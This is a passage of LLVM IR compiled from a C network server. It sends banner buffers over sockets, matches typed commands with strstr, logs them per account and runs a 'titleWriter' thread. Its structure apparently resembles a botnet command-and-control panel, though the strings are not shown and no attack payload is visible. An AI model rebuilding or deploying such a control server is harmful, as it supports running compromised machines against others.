  %1118 = call i64 @strlen(i8* %1117) #8
  %1119 = call i64 @send(i32 %1115, i8* %1116, i64 %1118, i32 16384)
  %1120 = icmp eq i64 %1119, -1
  br i1 %1120, label %1121, label %1122

; <label>:1121:                                   ; preds = %1114
  br label %2101

; <label>:1122:                                   ; preds = %1114
  %1123 = load i32, i32* %4, align 4
  %1124 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1125 = getelementptr inbounds [5000 x i8], [5000 x i8]* %76, i32 0, i32 0
  %1126 = call i64 @strlen(i8* %1125) #8
  %1127 = call i64 @send(i32 %1123, i8* %1124, i64 %1126, i32 16384)
  %1128 = icmp eq i64 %1127, -1
  br i1 %1128, label %1129, label %1130

; <label>:1129:                                   ; preds = %1122
  br label %2101

; <label>:1130:                                   ; preds = %1122
  %1131 = load i32, i32* %4, align 4
  %1132 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1133 = getelementptr inbounds [5000 x i8], [5000 x i8]* %77, i32 0, i32 0
  %1134 = call i64 @strlen(i8* %1133) #8
  %1135 = call i64 @send(i32 %1131, i8* %1132, i64 %1134, i32 16384)
  %1136 = icmp eq i64 %1135, -1
  br i1 %1136, label %1137, label %1138

; <label>:1137:                                   ; preds = %1130
  br label %2101

; <label>:1138:                                   ; preds = %1130
  %1139 = load i32, i32* %4, align 4
  %1140 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1141 = getelementptr inbounds [5000 x i8], [5000 x i8]* %78, i32 0, i32 0
  %1142 = call i64 @strlen(i8* %1141) #8
  %1143 = call i64 @send(i32 %1139, i8* %1140, i64 %1142, i32 16384)
  %1144 = icmp eq i64 %1143, -1
  br i1 %1144, label %1145, label %1146

; <label>:1145:                                   ; preds = %1138
  br label %2101

; <label>:1146:                                   ; preds = %1138
  %1147 = load i32, i32* %4, align 4
  %1148 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1149 = getelementptr inbounds [5000 x i8], [5000 x i8]* %79, i32 0, i32 0
  %1150 = call i64 @strlen(i8* %1149) #8
  %1151 = call i64 @send(i32 %1147, i8* %1148, i64 %1150, i32 16384)
  %1152 = icmp eq i64 %1151, -1
  br i1 %1152, label %1153, label %1154

; <label>:1153:                                   ; preds = %1146
  br label %2101

; <label>:1154:                                   ; preds = %1146
  %1155 = load i32, i32* %4, align 4
  %1156 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1157 = getelementptr inbounds [5000 x i8], [5000 x i8]* %80, i32 0, i32 0
  %1158 = call i64 @strlen(i8* %1157) #8
  %1159 = call i64 @send(i32 %1155, i8* %1156, i64 %1158, i32 16384)
  %1160 = icmp eq i64 %1159, -1
  br i1 %1160, label %1161, label %1162

; <label>:1161:                                   ; preds = %1154
  br label %2101

; <label>:1162:                                   ; preds = %1154
  %1163 = load i32, i32* %4, align 4
  %1164 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1165 = getelementptr inbounds [5000 x i8], [5000 x i8]* %81, i32 0, i32 0
  %1166 = call i64 @strlen(i8* %1165) #8
  %1167 = call i64 @send(i32 %1163, i8* %1164, i64 %1166, i32 16384)
  %1168 = icmp eq i64 %1167, -1
  br i1 %1168, label %1169, label %1170

; <label>:1169:                                   ; preds = %1162
  br label %2101

; <label>:1170:                                   ; preds = %1162
  %1171 = load i32, i32* %4, align 4
  %1172 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1173 = getelementptr inbounds [5000 x i8], [5000 x i8]* %82, i32 0, i32 0
  %1174 = call i64 @strlen(i8* %1173) #8
  %1175 = call i64 @send(i32 %1171, i8* %1172, i64 %1174, i32 16384)
  %1176 = icmp eq i64 %1175, -1
  br i1 %1176, label %1177, label %1178

; <label>:1177:                                   ; preds = %1170
  br label %2101

; <label>:1178:                                   ; preds = %1170
  %1179 = load i32, i32* %4, align 4
  %1180 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1181 = getelementptr inbounds [5000 x i8], [5000 x i8]* %83, i32 0, i32 0
  %1182 = call i64 @strlen(i8* %1181) #8
  %1183 = call i64 @send(i32 %1179, i8* %1180, i64 %1182, i32 16384)
  %1184 = icmp eq i64 %1183, -1
  br i1 %1184, label %1185, label %1186

; <label>:1185:                                   ; preds = %1178
  br label %2101

; <label>:1186:                                   ; preds = %1178
  %1187 = load i32, i32* %4, align 4
  %1188 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1189 = getelementptr inbounds [5000 x i8], [5000 x i8]* %84, i32 0, i32 0
  %1190 = call i64 @strlen(i8* %1189) #8
  %1191 = call i64 @send(i32 %1187, i8* %1188, i64 %1190, i32 16384)
  %1192 = icmp eq i64 %1191, -1
  br i1 %1192, label %1193, label %1194

; <label>:1193:                                   ; preds = %1186
  br label %2101

; <label>:1194:                                   ; preds = %1186
  %1195 = load i32, i32* %4, align 4
  %1196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1197 = getelementptr inbounds [5000 x i8], [5000 x i8]* %85, i32 0, i32 0
  %1198 = call i64 @strlen(i8* %1197) #8
  %1199 = call i64 @send(i32 %1195, i8* %1196, i64 %1198, i32 16384)
  %1200 = icmp eq i64 %1199, -1
  br i1 %1200, label %1201, label %1202

; <label>:1201:                                   ; preds = %1194
  br label %2101

; <label>:1202:                                   ; preds = %1194
  %1203 = load i32, i32* %4, align 4
  %1204 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1205 = getelementptr inbounds [5000 x i8], [5000 x i8]* %86, i32 0, i32 0
  %1206 = call i64 @strlen(i8* %1205) #8
  %1207 = call i64 @send(i32 %1203, i8* %1204, i64 %1206, i32 16384)
  %1208 = icmp eq i64 %1207, -1
  br i1 %1208, label %1209, label %1210

; <label>:1209:                                   ; preds = %1202
  br label %2101

; <label>:1210:                                   ; preds = %1202
  %1211 = load i32, i32* %4, align 4
  %1212 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %87, i32 0, i32 0
  %1214 = call i64 @strlen(i8* %1213) #8
  %1215 = call i64 @send(i32 %1211, i8* %1212, i64 %1214, i32 16384)
  %1216 = icmp eq i64 %1215, -1
  br i1 %1216, label %1217, label %1218

; <label>:1217:                                   ; preds = %1210
  br label %2101

; <label>:1218:                                   ; preds = %1210
  %1219 = load i32, i32* %4, align 4
  %1220 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %88, i32 0, i32 0
  %1222 = call i64 @strlen(i8* %1221) #8
  %1223 = call i64 @send(i32 %1219, i8* %1220, i64 %1222, i32 16384)
  %1224 = icmp eq i64 %1223, -1
  br i1 %1224, label %1225, label %1226

; <label>:1225:                                   ; preds = %1218
  br label %2101

; <label>:1226:                                   ; preds = %1218
  %1227 = load i32, i32* %4, align 4
  %1228 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %89, i32 0, i32 0
  %1230 = call i64 @strlen(i8* %1229) #8
  %1231 = call i64 @send(i32 %1227, i8* %1228, i64 %1230, i32 16384)
  %1232 = icmp eq i64 %1231, -1
  br i1 %1232, label %1233, label %1234

; <label>:1233:                                   ; preds = %1226
  br label %2101

; <label>:1234:                                   ; preds = %1226
  %1235 = load i8*, i8** %3, align 8
  %1236 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1235) #7
  br label %1237

; <label>:1237:                                   ; preds = %1234
  %1238 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1239 = load i32, i32* %5, align 4
  %1240 = sext i32 %1239 to i64
  %1241 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1240
  %1242 = getelementptr inbounds %struct.account, %struct.account* %1241, i32 0, i32 0
  %1243 = getelementptr inbounds [20 x i8], [20 x i8]* %1242, i32 0, i32 0
  %1244 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1245 = call i32 (i8*, i8*, ...) @sprintf(i8* %1238, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1243, i8* %1244) #7
  %1246 = load i32, i32* %4, align 4
  %1247 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1248 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1249 = call i64 @strlen(i8* %1248) #8
  %1250 = call i64 @send(i32 %1246, i8* %1247, i64 %1249, i32 16384)
  %1251 = icmp eq i64 %1250, -1
  br i1 %1251, label %1252, label %1253

; <label>:1252:                                   ; preds = %1237
  br label %2101

; <label>:1253:                                   ; preds = %1237
  br label %1254

; <label>:1254:                                   ; preds = %1253
  br label %337

; <label>:1255:                                   ; preds = %998
  %1256 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1257 = call i8* @strstr(i8* %1256, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.112, i32 0, i32 0)) #8
  %1258 = icmp ne i8* %1257, null
  br i1 %1258, label %1275, label %1259

; <label>:1259:                                   ; preds = %1255
  %1260 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1261 = call i8* @strstr(i8* %1260, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.113, i32 0, i32 0)) #8
  %1262 = icmp ne i8* %1261, null
  br i1 %1262, label %1275, label %1263

; <label>:1263:                                   ; preds = %1259
  %1264 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1265 = call i8* @strstr(i8* %1264, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.15, i32 0, i32 0)) #8
  %1266 = icmp ne i8* %1265, null
  br i1 %1266, label %1275, label %1267

; <label>:1267:                                   ; preds = %1263
  %1268 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1269 = call i8* @strstr(i8* %1268, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.114, i32 0, i32 0)) #8
  %1270 = icmp ne i8* %1269, null
  br i1 %1270, label %1275, label %1271

; <label>:1271:                                   ; preds = %1267
  %1272 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1273 = call i8* @strstr(i8* %1272, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0)) #8
  %1274 = icmp ne i8* %1273, null
  br i1 %1274, label %1275, label %1378

; <label>:1275:                                   ; preds = %1271, %1267, %1263, %1259, %1255
  %1276 = load i8*, i8** %3, align 8
  %1277 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1276) #7
  %1278 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1279 = call i32 (i8*, i8*, ...) @sprintf(i8* %1278, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.116, i32 0, i32 0)) #7
  %1280 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1281 = call i32 (i8*, i8*, ...) @sprintf(i8* %1280, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1282 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1283 = call i32 (i8*, i8*, ...) @sprintf(i8* %1282, i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.117, i32 0, i32 0)) #7
  %1284 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1285 = call i32 (i8*, i8*, ...) @sprintf(i8* %1284, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.118, i32 0, i32 0)) #7
  %1286 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1287 = call i32 (i8*, i8*, ...) @sprintf(i8* %1286, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.119, i32 0, i32 0)) #7
  %1288 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1289 = call i32 (i8*, i8*, ...) @sprintf(i8* %1288, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.120, i32 0, i32 0)) #7
  %1290 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1291 = call i32 (i8*, i8*, ...) @sprintf(i8* %1290, i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.121, i32 0, i32 0)) #7
  %1292 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1293 = call i32 (i8*, i8*, ...) @sprintf(i8* %1292, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.39, i32 0, i32 0)) #7
  %1294 = load i32, i32* %4, align 4
  %1295 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1296 = getelementptr inbounds [5000 x i8], [5000 x i8]* %90, i32 0, i32 0
  %1297 = call i64 @strlen(i8* %1296) #8
  %1298 = call i64 @send(i32 %1294, i8* %1295, i64 %1297, i32 16384)
  %1299 = icmp eq i64 %1298, -1
  br i1 %1299, label %1300, label %1301

; <label>:1300:                                   ; preds = %1275
  br label %2101

; <label>:1301:                                   ; preds = %1275
  %1302 = load i32, i32* %4, align 4
  %1303 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1304 = getelementptr inbounds [5000 x i8], [5000 x i8]* %91, i32 0, i32 0
  %1305 = call i64 @strlen(i8* %1304) #8
  %1306 = call i64 @send(i32 %1302, i8* %1303, i64 %1305, i32 16384)
  %1307 = icmp eq i64 %1306, -1
  br i1 %1307, label %1308, label %1309

; <label>:1308:                                   ; preds = %1301
  br label %2101

; <label>:1309:                                   ; preds = %1301
  %1310 = load i32, i32* %4, align 4
  %1311 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1312 = getelementptr inbounds [5000 x i8], [5000 x i8]* %92, i32 0, i32 0
  %1313 = call i64 @strlen(i8* %1312) #8
  %1314 = call i64 @send(i32 %1310, i8* %1311, i64 %1313, i32 16384)
  %1315 = icmp eq i64 %1314, -1
  br i1 %1315, label %1316, label %1317

; <label>:1316:                                   ; preds = %1309
  br label %2101

; <label>:1317:                                   ; preds = %1309
  %1318 = load i32, i32* %4, align 4
  %1319 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1320 = getelementptr inbounds [5000 x i8], [5000 x i8]* %93, i32 0, i32 0
  %1321 = call i64 @strlen(i8* %1320) #8
  %1322 = call i64 @send(i32 %1318, i8* %1319, i64 %1321, i32 16384)
  %1323 = icmp eq i64 %1322, -1
  br i1 %1323, label %1324, label %1325

; <label>:1324:                                   ; preds = %1317
  br label %2101

; <label>:1325:                                   ; preds = %1317
  %1326 = load i32, i32* %4, align 4
  %1327 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1328 = getelementptr inbounds [5000 x i8], [5000 x i8]* %94, i32 0, i32 0
  %1329 = call i64 @strlen(i8* %1328) #8
  %1330 = call i64 @send(i32 %1326, i8* %1327, i64 %1329, i32 16384)
  %1331 = icmp eq i64 %1330, -1
  br i1 %1331, label %1332, label %1333

; <label>:1332:                                   ; preds = %1325
  br label %2101

; <label>:1333:                                   ; preds = %1325
  %1334 = load i32, i32* %4, align 4
  %1335 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1336 = getelementptr inbounds [5000 x i8], [5000 x i8]* %95, i32 0, i32 0
  %1337 = call i64 @strlen(i8* %1336) #8
  %1338 = call i64 @send(i32 %1334, i8* %1335, i64 %1337, i32 16384)
  %1339 = icmp eq i64 %1338, -1
  br i1 %1339, label %1340, label %1341

; <label>:1340:                                   ; preds = %1333
  br label %2101

; <label>:1341:                                   ; preds = %1333
  %1342 = load i32, i32* %4, align 4
  %1343 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1344 = getelementptr inbounds [5000 x i8], [5000 x i8]* %96, i32 0, i32 0
  %1345 = call i64 @strlen(i8* %1344) #8
  %1346 = call i64 @send(i32 %1342, i8* %1343, i64 %1345, i32 16384)
  %1347 = icmp eq i64 %1346, -1
  br i1 %1347, label %1348, label %1349

; <label>:1348:                                   ; preds = %1341
  br label %2101

; <label>:1349:                                   ; preds = %1341
  %1350 = load i32, i32* %4, align 4
  %1351 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1352 = getelementptr inbounds [5000 x i8], [5000 x i8]* %97, i32 0, i32 0
  %1353 = call i64 @strlen(i8* %1352) #8
  %1354 = call i64 @send(i32 %1350, i8* %1351, i64 %1353, i32 16384)
  %1355 = icmp eq i64 %1354, -1
  br i1 %1355, label %1356, label %1357

; <label>:1356:                                   ; preds = %1349
  br label %2101

; <label>:1357:                                   ; preds = %1349
  %1358 = load i8*, i8** %3, align 8
  %1359 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %1358) #7
  br label %1360

; <label>:1360:                                   ; preds = %1357
  %1361 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1362 = load i32, i32* %5, align 4
  %1363 = sext i32 %1362 to i64
  %1364 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1363
  %1365 = getelementptr inbounds %struct.account, %struct.account* %1364, i32 0, i32 0
  %1366 = getelementptr inbounds [20 x i8], [20 x i8]* %1365, i32 0, i32 0
  %1367 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1368 = call i32 (i8*, i8*, ...) @sprintf(i8* %1361, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.29, i32 0, i32 0), i8* %1366, i8* %1367) #7
  %1369 = load i32, i32* %4, align 4
  %1370 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1371 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1372 = call i64 @strlen(i8* %1371) #8
  %1373 = call i64 @send(i32 %1369, i8* %1370, i64 %1372, i32 16384)
  %1374 = icmp eq i64 %1373, -1
  br i1 %1374, label %1375, label %1376

; <label>:1375:                                   ; preds = %1360
  br label %2101

; <label>:1376:                                   ; preds = %1360
  br label %1377

; <label>:1377:                                   ; preds = %1376
  br label %337

; <label>:1378:                                   ; preds = %1271
  %1379 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1380 = call i8* @strstr(i8* %1379, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.122, i32 0, i32 0)) #8
  %1381 = icmp ne i8* %1380, null
  br i1 %1381, label %1382, label %1401

; <label>:1382:                                   ; preds = %1378
  %1383 = load i32, i32* %5, align 4
  %1384 = sext i32 %1383 to i64
  %1385 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1384
  %1386 = getelementptr inbounds %struct.account, %struct.account* %1385, i32 0, i32 0
  %1387 = getelementptr inbounds [20 x i8], [20 x i8]* %1386, i32 0, i32 0
  %1388 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1389 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1387, i8* %1388)
  %1390 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1390, %struct._IO_FILE** %98, align 8
  %1391 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1392 = load i32, i32* %5, align 4
  %1393 = sext i32 %1392 to i64
  %1394 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1393
  %1395 = getelementptr inbounds %struct.account, %struct.account* %1394, i32 0, i32 0
  %1396 = getelementptr inbounds [20 x i8], [20 x i8]* %1395, i32 0, i32 0
  %1397 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1398 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1391, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1396, i8* %1397)
  %1399 = load %struct._IO_FILE*, %struct._IO_FILE** %98, align 8
  %1400 = call i32 @fclose(%struct._IO_FILE* %1399)
  br label %2101

; <label>:1401:                                   ; preds = %1378
  %1402 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1403 = call i8* @strstr(i8* %1402, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0)) #8
  %1404 = icmp ne i8* %1403, null
  br i1 %1404, label %1405, label %1424

; <label>:1405:                                   ; preds = %1401
  %1406 = load i32, i32* %5, align 4
  %1407 = sext i32 %1406 to i64
  %1408 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1407
  %1409 = getelementptr inbounds %struct.account, %struct.account* %1408, i32 0, i32 0
  %1410 = getelementptr inbounds [20 x i8], [20 x i8]* %1409, i32 0, i32 0
  %1411 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1412 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1410, i8* %1411)
  %1413 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1413, %struct._IO_FILE** %99, align 8
  %1414 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1415 = load i32, i32* %5, align 4
  %1416 = sext i32 %1415 to i64
  %1417 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1416
  %1418 = getelementptr inbounds %struct.account, %struct.account* %1417, i32 0, i32 0
  %1419 = getelementptr inbounds [20 x i8], [20 x i8]* %1418, i32 0, i32 0
  %1420 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1421 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1414, i8* getelementptr inbounds ([77 x i8], [77 x i8]* @.str.123, i32 0, i32 0), i8* %1419, i8* %1420)
  %1422 = load %struct._IO_FILE*, %struct._IO_FILE** %99, align 8
  %1423 = call i32 @fclose(%struct._IO_FILE* %1422)
  br label %2101

; <label>:1424:                                   ; preds = %1401
  %1425 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1426 = call i8* @strstr(i8* %1425, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.126, i32 0, i32 0)) #8
  %1427 = icmp ne i8* %1426, null
  br i1 %1427, label %1432, label %1428

; <label>:1428:                                   ; preds = %1424
  %1429 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1430 = call i8* @strstr(i8* %1429, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.127, i32 0, i32 0)) #8
  %1431 = icmp ne i8* %1430, null
  br i1 %1431, label %1432, label %1451

; <label>:1432:                                   ; preds = %1428, %1424
  %1433 = load i32, i32* %5, align 4
  %1434 = sext i32 %1433 to i64
  %1435 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1434
  %1436 = getelementptr inbounds %struct.account, %struct.account* %1435, i32 0, i32 0
  %1437 = getelementptr inbounds [20 x i8], [20 x i8]* %1436, i32 0, i32 0
  %1438 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1439 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([95 x i8], [95 x i8]* @.str.128, i32 0, i32 0), i8* %1437, i8* %1438)
  %1440 = call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0))
  store %struct._IO_FILE* %1440, %struct._IO_FILE** %100, align 8
  %1441 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1442 = load i32, i32* %5, align 4
  %1443 = sext i32 %1442 to i64
  %1444 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %1443
  %1445 = getelementptr inbounds %struct.account, %struct.account* %1444, i32 0, i32 0
  %1446 = getelementptr inbounds [20 x i8], [20 x i8]* %1445, i32 0, i32 0
  %1447 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1448 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1441, i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.130, i32 0, i32 0), i8* %1446, i8* %1447)
  %1449 = load %struct._IO_FILE*, %struct._IO_FILE** %100, align 8
  %1450 = call i32 @fclose(%struct._IO_FILE* %1449)
  br label %2101

; <label>:1451:                                   ; preds = %1428
  %1452 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1453 = call i8* @strstr(i8* %1452, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.131, i32 0, i32 0)) #8
  %1454 = icmp ne i8* %1453, null
  br i1 %1454, label %1459, label %1455

; <label>:1455:                                   ; preds = %1451
  %1456 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1457 = call i8* @strstr(i8* %1456, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.132, i32 0, i32 0)) #8
  %1458 = icmp ne i8* %1457, null
  br i1 %1458, label %1459, label %1470

; <label>:1459:                                   ; preds = %1455, %1451
  %1460 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1461 = call i32 (i8*, i8*, ...) @sprintf(i8* %1460, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.133, i32 0, i32 0)) #7
  %1462 = load i32, i32* %4, align 4
  %1463 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1464 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1465 = call i64 @strlen(i8* %1464) #8
  %1466 = call i64 @send(i32 %1462, i8* %1463, i64 %1465, i32 16384)
  %1467 = icmp eq i64 %1466, -1
  br i1 %1467, label %1468, label %1469

; <label>:1468:                                   ; preds = %1459
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1469:                                   ; preds = %1459
  br label %1470

; <label>:1470:                                   ; preds = %1469, %1455
  %1471 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1472 = call i8* @strstr(i8* %1471, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.134, i32 0, i32 0)) #8
  %1473 = icmp ne i8* %1472, null
  br i1 %1473, label %1474, label %1485

; <label>:1474:                                   ; preds = %1470
  %1475 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1476 = call i32 (i8*, i8*, ...) @sprintf(i8* %1475, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.135, i32 0, i32 0)) #7
  %1477 = load i32, i32* %4, align 4
  %1478 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1479 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1480 = call i64 @strlen(i8* %1479) #8
  %1481 = call i64 @send(i32 %1477, i8* %1478, i64 %1480, i32 16384)
  %1482 = icmp eq i64 %1481, -1
  br i1 %1482, label %1483, label %1484

; <label>:1483:                                   ; preds = %1474
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1484:                                   ; preds = %1474
  br label %1485

; <label>:1485:                                   ; preds = %1484, %1470
  %1486 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i32 0, i32 0
  %1487 = call i8* @strstr(i8* %1486, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.136, i32 0, i32 0)) #8
  %1488 = icmp ne i8* %1487, null
  br i1 %1488, label %1489, label %1500

; <label>:1489:                                   ; preds = %1485
  %1490 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1491 = call i32 (i8*, i8*, ...) @sprintf(i8* %1490, i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.137, i32 0, i32 0)) #7
  %1492 = load i32, i32* %4, align 4
  %1493 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i32 0, i32 0
  %1495 = call i64 @strlen(i8* %1494) #8
  %1496 = call i64 @send(i32 %1492, i8* %1493, i64 %1495, i32 16384)
  %1497 = icmp eq i64 %1496, -1
  br i1 %1497, label %1498, label %1499

; <label>:1498:                                   ; preds = %1489
  store i8* null, i8** %2, align 8
  br label %2110

; <label>:1499:                                   ; preds = %1489
  br label %1500

; <label>:1500:                                   ; preds = %1499, %1485
